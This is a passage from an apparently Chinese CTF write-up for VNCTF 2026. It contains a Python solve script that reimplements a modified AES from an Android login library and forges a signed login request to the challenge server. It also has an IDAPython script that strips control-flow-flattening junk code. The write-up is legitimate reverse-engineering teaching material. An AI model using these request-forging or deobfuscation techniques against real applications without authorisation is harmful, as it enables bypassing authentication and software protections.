class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">CUSTOM_B64 = <span class="string">&quot;RSTUVWLbcdefghiMNOPrstuvQXYZajCklmnEFGHIJKwxyz01ABD234opq56789+/&quot;</span></span><br><span class="line">STD_B64 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Non-standard S-box from liblogin.so (byte_62040)</span></span><br><span class="line">SBOX = [</span><br><span class="line">    <span class="number">0x20</span>,<span class="number">0x7b</span>,<span class="number">0x18</span>,<span class="number">0xa7</span>,<span class="number">0x42</span>,<span class="number">0x44</span>,<span class="number">0xd7</span>,<span class="number">0x4a</span>,<span class="number">0xcd</span>,<span class="number">0x32</span>,<span class="number">0xd1</span>,<span class="number">0xec</span>,<span class="number">0xf3</span>,<span class="number">0x81</span>,<span class="number">0xa5</span>,<span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x0e</span>,<span class="number">0x91</span>,<span class="number">0x4b</span>,<span class="number">0xf0</span>,<span class="number">0xe9</span>,<span class="number">0x5d</span>,<span class="number">0x8d</span>,<span class="number">0xf5</span>,<span class="number">0x46</span>,<span class="number">0xfc</span>,<span class="number">0x31</span>,<span class="number">0x36</span>,<span class="number">0xb6</span>,<span class="number">0xac</span>,<span class="number">0x9b</span>,<span class="number">0xb9</span>,</span><br><span class="line">    <span class="number">0x26</span>,<span class="number">0x09</span>,<span class="number">0xe6</span>,<span class="number">0x40</span>,<span class="number">0xd4</span>,<span class="number">0xb0</span>,<span class="number">0x51</span>,<span class="number">0x4f</span>,<span class="number">0x9c</span>,<span class="number">0x3e</span>,<span class="number">0xe7</span>,<span class="number">0x79</span>,<span class="number">0x30</span>,<span class="number">0x88</span>,<span class="number">0xb1</span>,<span class="number">0x3c</span>,</span><br><span class="line">    <span class="number">0x7a</span>,<span class="number">0x5c</span>,<span class="number">0xd3</span>,<span class="number">0x14</span>,<span class="number">0x5a</span>,<span class="number">0xab</span>,<span class="number">0x56</span>,<span class="number">0xc0</span>,<span class="number">0x04</span>,<span class="number">0x29</span>,<span class="number">0xd0</span>,<span class="number">0x3b</span>,<span class="number">0x1f</span>,<span class="number">0xf9</span>,<span class="number">0xa3</span>,<span class="number">0x57</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x8a</span>,<span class="number">0x84</span>,<span class="number">0x16</span>,<span class="number">0xf4</span>,<span class="number">0x1a</span>,<span class="number">0xea</span>,<span class="number">0x64</span>,<span class="number">0xa6</span>,<span class="number">0xd6</span>,<span class="number">0x2e</span>,<span class="number">0xbe</span>,<span class="number">0x2f</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xe0</span>,</span><br><span class="line">    <span class="number">0x1e</span>,<span class="number">0x02</span>,<span class="number">0x3a</span>,<span class="number">0x22</span>,<span class="number">0x8f</span>,<span class="number">0x9f</span>,<span class="number">0xcb</span>,<span class="number">0xa8</span>,<span class="number">0x2c</span>,<span class="number">0x67</span>,<span class="number">0x34</span>,<span class="number">0x25</span>,<span class="number">0xd5</span>,<span class="number">0xff</span>,<span class="number">0xef</span>,<span class="number">0xf6</span>,</span><br><span class="line">    <span class="number">0xe2</span>,<span class="number">0xaa</span>,<span class="number">0xd9</span>,<span class="number">0x72</span>,<span class="number">0xfe</span>,<span class="number">0xce</span>,<span class="number">0xa1</span>,<span class="number">0x78</span>,<span class="number">0x85</span>,<span class="number">0x96</span>,<span class="number">0x2a</span>,<span class="number">0x77</span>,<span class="number">0xca</span>,<span class="number">0xc1</span>,<span class="number">0x37</span>,<span class="number">0x74</span>,</span><br><span class="line">    <span class="number">0xa2</span>,<span class="number">0x5e</span>,<span class="number">0x6c</span>,<span class="number">0xfd</span>,<span class="number">0xb8</span>,<span class="number">0x4d</span>,<span class="number">0x7d</span>,<span class="number">0x70</span>,<span class="number">0xb3</span>,<span class="number">0xdd</span>,<span class="number">0xcf</span>,<span class="number">0x71</span>,<span class="number">0x73</span>,<span class="number">0x61</span>,<span class="number">0xf8</span>,<span class="number">0x19</span>,</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xe3</span>,<span class="number">0x63</span>,<span class="number">0x33</span>,<span class="number">0x3d</span>,<span class="number">0x15</span>,<span class="number">0xae</span>,<span class="number">0x98</span>,<span class="number">0xe5</span>,<span class="number">0x80</span>,<span class="number">0xbd</span>,<span class="number">0xbc</span>,<span class="number">0x82</span>,<span class="number">0xc6</span>,<span class="number">0x94</span>,<span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0xe4</span>,<span class="number">0xde</span>,<span class="number">0x06</span>,<span class="number">0x50</span>,<span class="number">0x95</span>,<span class="number">0xdf</span>,<span class="number">0x47</span>,<span class="number">0xf7</span>,<span class="number">0x90</span>,<span class="number">0x8b</span>,<span class="number">0x45</span>,<span class="number">0x9a</span>,<span class="number">0x6e</span>,<span class="number">0x07</span>,<span class="number">0xad</span>,<span class="number">0x1c</span>,</span><br><span class="line">    <span class="number">0x35</span>,<span class="number">0x83</span>,<span class="number">0x68</span>,<span class="number">0x03</span>,<span class="number">0x6f</span>,<span class="number">0x5b</span>,<span class="number">0xb7</span>,<span class="number">0xfb</span>,<span class="number">0x1d</span>,<span class="number">0xc5</span>,<span class="number">0x10</span>,<span class="number">0x7c</span>,<span class="number">0xd8</span>,<span class="number">0x6a</span>,<span class="number">0xcc</span>,<span class="number">0x69</span>,</span><br><span class="line">    <span class="number">0x8e</span>,<span class="number">0x24</span>,<span class="number">0x4c</span>,<span class="number">0x39</span>,<span class="number">0xb4</span>,<span class="number">0xa0</span>,<span class="number">0x0b</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0xa9</span>,<span class="number">0xb2</span>,<span class="number">0x8c</span>,<span class="number">0x0a</span>,<span class="number">0xbf</span>,<span class="number">0x28</span>,<span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x6d</span>,<span class="number">0xaf</span>,<span class="number">0xda</span>,<span class="number">0x41</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0xb5</span>,<span class="number">0x43</span>,<span class="number">0xc3</span>,<span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x2b</span>,<span class="number">0x55</span>,<span class="number">0xf2</span>,<span class="number">0x9e</span>,<span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x12</span>,<span class="number">0x23</span>,<span class="number">0x0d</span>,<span class="number">0xdb</span>,<span class="number">0x6b</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0x7f</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x08</span>,<span class="number">0xed</span>,<span class="number">0xe1</span>,<span class="number">0xbb</span>,<span class="number">0xee</span>,<span class="number">0x9d</span>,</span><br><span class="line">    <span class="number">0xd2</span>,<span class="number">0x92</span>,<span class="number">0x49</span>,<span class="number">0x3f</span>,<span class="number">0xdc</span>,<span class="number">0x58</span>,<span class="number">0x87</span>,<span class="number">0xc2</span>,<span class="number">0xba</span>,<span class="number">0x99</span>,<span class="number">0xc9</span>,<span class="number">0x4e</span>,<span class="number">0xf1</span>,<span class="number">0x21</span>,<span class="number">0xeb</span>,<span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x65</span>,<span class="number">0x59</span>,<span class="number">0x76</span>,<span class="number">0x0c</span>,<span class="number">0xc8</span>,<span class="number">0x05</span>,<span class="number">0xa4</span>,<span class="number">0x54</span>,<span class="number">0x93</span>,<span class="number">0x1b</span>,<span class="number">0x66</span>,<span class="number">0x11</span>,<span class="number">0x27</span>,<span class="number">0x53</span>,<span class="number">0x7e</span>,<span class="number">0x0f</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">RCON = [<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x80</span>,<span class="number">0x1b</span>,<span class="number">0x36</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xtime</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1b</span>) &amp; <span class="number">0xff</span> <span class="keyword">if</span> a &amp; <span class="number">0x80</span> <span class="keyword">else</span> (a &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gmul</span>(<span class="params">a, b</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> b &amp; <span class="number">1</span>:</span><br><span class="line">            res ^= a</span><br><span class="line">        a = xtime(a)</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_expansion</span>(<span class="params">key</span>):</span><br><span class="line">    w = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        word = key[<span class="number">4</span> * i : <span class="number">4</span> * i + <span class="number">4</span>]</span><br><span class="line">        w.append((word[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (word[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (word[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | word[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">44</span>):</span><br><span class="line">        temp = w[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            temp = ((temp &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFF</span>) | (temp &gt;&gt; <span class="number">24</span>)</span><br><span class="line">            temp = (</span><br><span class="line">                (SBOX[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">                | (SBOX[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">                | (SBOX[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">                | (SBOX[temp &amp; <span class="number">0xFF</span>])</span><br><span class="line">            )</span><br><span class="line">            temp ^= RCON[(i // <span class="number">4</span>) - <span class="number">1</span>] &lt;&lt; <span class="number">24</span></span><br><span class="line">        w.append(w[i - <span class="number">4</span>] ^ temp)</span><br><span class="line">    rks = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        rk = [[<span class="number">0</span>] * <span class="number">4</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            word = w[r * <span class="number">4</span> + c]</span><br><span class="line">            rk[<span class="number">0</span>][c] = (word &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            rk[<span class="number">1</span>][c] = (word &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            rk[<span class="number">2</span>][c] = (word &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            rk[<span class="number">3</span>][c] = word &amp; <span class="number">0xFF</span></span><br><span class="line">        rks.append(rk)</span><br><span class="line">    <span class="keyword">return</span> rks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">state, rk</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            state[r][c] ^= rk[r][c] ^ <span class="number">0x91</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            state[r][c] = SBOX[state[r][c]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        state[r] = state[r][r:] + state[r][:r]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        a = [state[r][c] <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        state[<span class="number">0</span>][c] = gmul(a[<span class="number">0</span>], <span class="number">2</span>) ^ gmul(a[<span class="number">1</span>], <span class="number">3</span>) ^ a[<span class="number">2</span>] ^ a[<span class="number">3</span>]</span><br><span class="line">        state[<span class="number">1</span>][c] = a[<span class="number">0</span>] ^ gmul(a[<span class="number">1</span>], <span class="number">2</span>) ^ gmul(a[<span class="number">2</span>], <span class="number">3</span>) ^ a[<span class="number">3</span>]</span><br><span class="line">        state[<span class="number">2</span>][c] = a[<span class="number">0</span>] ^ a[<span class="number">1</span>] ^ gmul(a[<span class="number">2</span>], <span class="number">2</span>) ^ gmul(a[<span class="number">3</span>], <span class="number">3</span>)</span><br><span class="line">        state[<span class="number">3</span>][c] = gmul(a[<span class="number">0</span>], <span class="number">3</span>) ^ a[<span class="number">1</span>] ^ a[<span class="number">2</span>] ^ gmul(a[<span class="number">3</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">pt, rks</span>):</span><br><span class="line">    state = [[<span class="number">0</span>] * <span class="number">4</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            state[r][c] = pt[idx]</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">    add_round_key(state, rks[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        shift_rows(state)</span><br><span class="line">        sub_bytes(state)</span><br><span class="line">        mix_columns(state)</span><br><span class="line">        add_round_key(state, rks[r])</span><br><span class="line">    shift_rows(state)</span><br><span class="line">    sub_bytes(state)</span><br><span class="line">    add_round_key(state, rks[<span class="number">10</span>])</span><br><span class="line">    out = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            out[idx] = state[r][c]</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    rks = key_expansion(key)</span><br><span class="line">    out = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">16</span>):</span><br><span class="line">        out += encrypt_block(data[i : i + <span class="number">16</span>], rks)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: solve.py&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    base = <span class="string">&quot;http://114.66.24.228:34014&quot;</span></span><br><span class="line">    username = <span class="string">&quot;VNCTF2026&quot;</span></span><br><span class="line">    password = <span class="string">&quot;Vv&amp;nN_W3lC0me!!&quot;</span></span><br><span class="line">    android_id = <span class="string">&quot;b2e90a5f379ea4db&quot;</span></span><br><span class="line"></span><br><span class="line">    key = urllib.request.urlopen(base + <span class="string">&quot;/getkey&quot;</span>, timeout=<span class="number">10</span>).read().decode().strip()</span><br><span class="line">    key16 = key.encode()[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>:<span class="subst">&#123;password&#125;</span>&quot;</span></span><br><span class="line">    plain = <span class="string">f&quot;<span class="subst">&#123;payload&#125;</span>:<span class="subst">&#123;android_id&#125;</span>&quot;</span>.encode()</span><br><span class="line">    pad = (<span class="number">16</span> - (<span class="built_in">len</span>(plain) &amp; <span class="number">0xF</span>)) &amp; <span class="number">0xF</span></span><br><span class="line">    plain_padded = plain + <span class="string">b&quot;\x01&quot;</span> * pad</span><br><span class="line"></span><br><span class="line">    ct = encrypt(plain_padded, key16)</span><br><span class="line">    enc_std = base64.b64encode(ct).decode()</span><br><span class="line">    enc_custom = enc_std.translate(<span class="built_in">str</span>.maketrans(STD_B64, CUSTOM_B64))</span><br><span class="line"></span><br><span class="line">    msg = <span class="string">f&quot;VNCTF:<span class="subst">&#123;payload&#125;</span>:<span class="subst">&#123;android_id&#125;</span>:<span class="subst">&#123;enc_custom&#125;</span>:0:0:0&quot;</span></span><br><span class="line">    sign = hashlib.md5(msg.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    req = urllib.request.Request(base + <span class="string">&quot;/login&quot;</span>, data=enc_custom.encode(), method=<span class="string">&quot;POST&quot;</span>)</span><br><span class="line">    req.add_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain; charset=utf-8&quot;</span>)</span><br><span class="line">    req.add_header(<span class="string">&quot;sign&quot;</span>, sign)</span><br><span class="line">    resp = urllib.request.urlopen(req, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp.read().decode())</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>VNCTF{32_7R4f1Ic_LOGin_SNjWxxn4}</p><h2 id="delicious-obf"><a href="#delicious-obf" class="headerlink" title="delicious_obf"></a>delicious_obf</h2><p>好大一坨</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260204203419200.png" alt="image-20260204203419200"></p><p>这是典型的控制流平坦化入口指令序列，本质是计算一个目标地址，然后用 jmp r10 间接跳转</p><p>xor 后结果固定是 0x4，所以 r10 固定变成 loc_140006560</p><p>还有个jz&#x2F;jnz的花指令</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260204203730941.png" alt="image-20260204203730941"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov esi, 0x4C552200</span><br><span class="line">lea edx, [0x140005E00 + 0x2BA]  ; = 0x1400060BA</span><br><span class="line">mov r11d, 0xA6DF5837</span><br><span class="line">xor r11d, 0xA6DF5833            ; r11d = 0x4</span><br><span class="line">add r10, r11                    ; r10 += 4</span><br><span class="line">jmp r10                         ; 间接跳</span><br></pre></td></tr></table></figure><p>可以发现跟之前一样</p><p>0x1400060BA+4&#x3D;0x1400060BE</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260204204447229.png" alt="image-20260204204447229"></p><ul><li>4C：REX 前缀（REX.W&#x3D;1 用 64 位，REX.R&#x3D;1 扩展寄存器编码）</li><li>8D：LEA 指令 opcode</li><li>15：ModRM（mod&#x3D;00, rm&#x3D;101 表示 [RIP+disp32]；reg&#x3D;010 再加上 REX.R&#x3D;1 变成 r10）</li><li>B5 00 00 00：disp32 &#x3D; 0xB5（小端）</li></ul><p>我们发现了相似结构</p><p>可以写个批量脚本看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop_code</span>(<span class="params">ea: <span class="built_in">int</span>, length: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        ida_bytes.patch_byte(ea + i, <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_text_segment</span>(<span class="params">seg_start: <span class="built_in">int</span>, seg_end: <span class="built_in">int</span></span>):</span><br><span class="line">    current_addr = seg_start</span><br><span class="line">    end_addr = <span class="built_in">min</span>(seg_start + <span class="number">0x10000</span>, seg_end)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> current_addr &lt; end_addr:</span><br><span class="line">        current_byte = ida_bytes.get_byte(current_addr)</span><br><span class="line">        op = ida_bytes.get_word(current_addr + <span class="number">1</span>)</span><br><span class="line">        nxt = ida_bytes.get_word(current_addr + <span class="number">7</span>) </span><br><span class="line"></span><br><span class="line">        b23 = ida_bytes.get_byte(current_addr + <span class="number">23</span>)</span><br><span class="line">        <span class="keyword">if</span> current_byte == <span class="number">0x4C</span> <span class="keyword">and</span> op == <span class="number">0x158D</span> <span class="keyword">and</span> nxt == <span class="number">0xBB41</span> <span class="keyword">and</span> b23 == <span class="number">0xE8</span>:</span><br><span class="line">            offest1 = ida_bytes.get_dword(current_addr + <span class="number">3</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> offest1 &amp; <span class="number">0x80000000</span>:</span><br><span class="line">               offest1 -= <span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line">            addr = offest1 + <span class="number">4</span> + <span class="number">7</span> - <span class="number">5</span>   <span class="comment"># 保持原公式（= offest1 + 6）</span></span><br><span class="line">            gar_code = offest1 + <span class="number">7</span> + current_addr</span><br><span class="line"></span><br><span class="line">            nop_code(current_addr, <span class="number">35</span>)</span><br><span class="line">            nop_code(gar_code, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">            ida_bytes.patch_byte(current_addr, <span class="number">0xE9</span>)          <span class="comment"># JMP rel32</span></span><br><span class="line">            ida_bytes.patch_dword(current_addr + <span class="number">1</span>, addr)     <span class="comment"># 写入 rel32</span></span><br><span class="line">            <span class="comment"># 继续扫描</span></span><br><span class="line">            current_addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> current_byte == <span class="number">0x4C</span> <span class="keyword">and</span> op == <span class="number">0x158D</span> <span class="keyword">and</span> nxt == <span class="number">0xBB41</span> <span class="keyword">and</span> b23 == <span class="number">0x74</span>:</span><br><span class="line">            offest1 = ida_bytes.get_dword(current_addr + <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> offest1 &amp; <span class="number">0x80000000</span>:</span><br><span class="line">               offest1 -= <span class="number">0x100000000</span></span><br><span class="line">            </span><br><span class="line">            addr = offest1 + <span class="number">4</span> + <span class="number">7</span> - <span class="number">5</span></span><br><span class="line">            gar_code = offest1 + <span class="number">7</span> + current_addr</span><br><span class="line"></span><br><span class="line">            nop_code(current_addr, <span class="number">30</span>)</span><br><span class="line">            nop_code(gar_code, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">            ida_bytes.patch_byte(current_addr, <span class="number">0xE9</span>)</span><br><span class="line">            ida_bytes.patch_dword(current_addr + <span class="number">1</span>, addr)</span><br><span class="line"></span><br><span class="line">            current_addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        current_addr += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    n = ida_segment.get_segm_qty()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        seg = ida_segment.getnseg(i)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> seg:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        seg_name = ida_segment.get_segm_name(seg)</span><br><span class="line">        ida_kernwin.msg(seg_name + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> seg_name == <span class="string">&quot;.text&quot;</span>:</span><br><span class="line">            process_text_segment(seg.start_ea, seg.end_ea)</span><br><span class="line"></span><br><span class="line">    ida_kernwin.msg(<span class="string">&quot;[+] Done.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ida_bytes.get_dword()读出来的是无符号数</p><p>FC FF FF FF 这在 x86 指令语义里表示：rel32 &#x3D; -4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call rel32</span><br><span class="line">jmp  rel32</span><br><span class="line">lea reg, [rip + rel32]</span><br></pre></td></tr></table></figure><p>CPU 做的是：target &#x3D; next_ip + (int32_t)rel32;</p><p>所以要把0xFFFFFFFC还原成-4</p><p>建议使用如下的判断方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if offest1 &amp; 0x80000000:</span><br><span class="line">     offest1 -= 